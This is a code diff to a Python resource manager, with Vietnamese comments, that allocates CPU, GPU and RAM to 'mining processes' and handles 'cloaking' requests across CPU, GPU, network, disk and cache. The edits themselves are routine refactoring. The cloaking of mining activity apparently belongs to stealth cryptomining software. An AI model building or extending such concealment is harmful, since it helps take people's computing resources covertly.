@@ -615,7 +615,10 @@ class ResourceManager(BaseManager):
     def allocate_resources_with_priority(self):
         with self.resource_lock.gen_wlock(), self.mining_processes_lock.gen_rlock():
             sorted_processes = sorted(
-                self.mining_processes, key=lambda p: p.priority, reverse=True)
+                self.mining_processes,
+                key=lambda p: p.priority if isinstance(p.priority, int) else 0,
+                reverse=True
+            )
             total_cpu_cores = psutil.cpu_count(logical=True)
             allocated_cores = 0
 
@@ -636,23 +639,6 @@ class ResourceManager(BaseManager):
                 }
                 self.resource_adjustment_queue.put((3, adjustment_task))
                 allocated_cores += cores_to_allocate
-
-                if (self.shared_resource_manager.is_gpu_initialized() and
-                        process.name.lower() == self.config['processes'].get('GPU', '').lower()):
-                    # Truyền list rỗng, sau đó handle GPU usage
-                    adjustment_task = {
-                        'function': 'adjust_gpu_usage',
-                        'args': (process, [])
-                    }
-                    self.resource_adjustment_queue.put((3, adjustment_task))
-
-                ram_limit_mb = self.config['resource_allocation']['ram'].get(
-                    'max_allocation_mb', 1024)
-                adjustment_task = {
-                    'function': 'adjust_ram_allocation',
-                    'args': (process.pid, ram_limit_mb, process.name)
-                }
-                self.resource_adjustment_queue.put((3, adjustment_task))
 
     def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
         try:
@@ -794,10 +780,9 @@ class ResourceManager(BaseManager):
                     'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                 }
                 self.resource_adjustment_queue.put((1, adjustment_task))
-                # [CHANGES] task_done() chỉ gọi một lần cho mỗi get()
                 self.cloaking_request_queue.task_done()
             except Empty:
-                continue
+                pass
             except Exception as e:
                 self.logger.error(
                     f"Lỗi trong quá trình xử lý yêu cầu cloaking: {e}")
@@ -864,26 +849,19 @@ class ResourceManager(BaseManager):
             self.logger.error(
                 f"Lỗi khi áp dụng điều chỉnh từ MonitorThread cho tiến trình {process.name} (PID: {process.pid}): {e}")
 
-    # [CHANGES] Kiểm soát việc trích xuất GPU config, tránh gọi len() sai kiểu
     def apply_recommended_action(self, action: List[Any], process: MiningProcess):
-        """
-        action = [cpu_threads, ram_allocation_mb, (n giá trị GPU?), disk_io_limit, network_bw_limit, cache_limit...]
-        """
         try:
             cpu_threads = int(action[0])
             ram_allocation_mb = int(action[1])
 
-            # GPU config có thể là list hoặc int
             gpu_config = self.config.get("resource_allocation", {}).get("gpu", {}).get("max_usage_percent", [])
 
             gpu_usage_percent = []
             if isinstance(gpu_config, list):
-                # Ví dụ user config GPU = [80, 80, ...]
                 length_needed = len(gpu_config)
-                gpu_usage_percent = list(action[2 : 2 + length_needed])
+                gpu_usage_percent = list(action[2:2 + length_needed])
                 next_index = 2 + length_needed
             elif isinstance(gpu_config, (int, float)):
-                # Nếu config là single int/float => chỉ lấy 1 slot GPU usage
                 gpu_usage_percent = [float(action[2])]
                 next_index = 3
             else:
